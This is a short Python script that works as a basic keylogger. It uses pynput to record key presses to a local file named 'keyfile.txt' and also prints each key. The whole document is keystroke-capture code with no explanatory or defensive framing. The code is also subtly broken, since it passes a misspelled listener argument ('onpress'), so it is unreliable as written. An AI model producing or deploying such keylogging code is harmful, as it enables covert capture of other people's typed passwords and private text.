from pynput import keyboard

def KeyPressed(key):
    print(str(key))
    with open("keyfile.txt",'a') as file:
        try:
            char = key.char
            file.write(char)
        except:
            print("error getting character")

if __name__ == "__main__":
    listener = keyboard.Listener(onpress = KeyPressed)
    listener.start()
    input()
